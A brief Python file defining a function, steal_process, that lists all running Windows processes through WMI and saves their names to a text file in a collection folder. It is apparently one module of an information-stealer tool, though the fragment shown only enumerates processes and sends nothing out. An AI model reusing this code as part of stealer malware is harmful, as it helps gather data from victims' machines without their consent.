import psutil
import os
import wmi

# extract all process in systeam
def steal_process(king_folder: str) -> None:
    all_process: list[str] = []
    try:
        c: object = wmi.WMI()
        for process in c.Win32_Process():
            all_process.append(process.Name)

        with open(os.path.join(king_folder, 'Process.txt'),  'w', encoding='utf-8', errors='ignore') as proc:
            proc.write("\n".join(str(x) for x in all_process))
    except Exception as err:
        print(err)